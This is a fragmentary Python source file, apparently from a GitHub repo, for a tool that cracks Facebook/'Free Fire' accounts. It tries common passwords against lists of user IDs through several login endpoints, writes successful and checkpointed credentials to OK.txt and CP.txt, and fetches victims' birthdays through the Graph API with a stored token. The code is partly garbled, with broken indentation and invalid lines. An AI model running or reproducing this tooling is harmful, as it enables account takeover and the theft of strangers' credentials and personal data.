...
# https://github.com/AKASH-EVAN/DECODER
...
def readline___Public_Xml():
	logo()
	print (' [*]=============================================')
	print(" [1] Start FREE FIRE ID Cracking  ")
	print(" [2] Create Supper File FF ID  [ Unlamented ]")
	print(" [3] Feedback")
	print(" [4] YouTube ")
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#Akash_Evan('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			Akash_Evan(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
			...
			Akash_Evan('\nEnter Password 123456 or 123456789 For FF Idz ')
			while True:
				pwek = input('\nEnter Password : ')
				#Akash_Evan('Sandi > %s'%(pwek))
				if pwek == '':
					Akash_Evan('\nJangan Kosong')
					time.sleep(1)
					exit()
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							Akash_Evan('[•] Result CP saved to CP.txt')
							Akash_Evan('\n\tCrack Processing...\n')
							Akash_Evan('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					Akash_Evan('\n01.) Metode b-api ')
					Akash_Evan('02.) Metode mbasic ')
					Akash_Evan('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			Akash_Evan('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			Akash_Evan(' [1] C.S.E Method 1 ')
			Akash_Evan(' [2] C.S.E Method 2  [ Pro ]')
			Akash_Evan(' [3] C.S.E Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [C.S.E] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				Akash_Evan('\r\033[1;92m[Successful-C.S.E] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					Akash_Evan('\r\033[1;91m[Checkpoint-C.S.E] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				Akash_Evan('\r\033[1;91m[Checkpoint-C.S.E] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				Akash_Evan('\r\033[1;32m[Successful-C.S.E] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_AKASH('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].Akash_Evan('\r\033[1;91m[Checkpoint-C.S.E] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				Akash_Evan('\r\033[1;92m[Successful-C.S.E] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = AKASH('token.txt').read()
					cp_ttl = Prof_C.S.E('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					Akash_Evan('\r\033[1;91m[Checkpoint-C.S.E] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
██┘███┘▕█╱┈███
 [*]=============================================
    Author   : Akash Evan
    Facebook : https://www.facebook.com/profile.php?id=100055559211884
    Team     : Akash + Evan
    Connect  : C.S.E🌺
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://wa.me/+088 01840865178")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
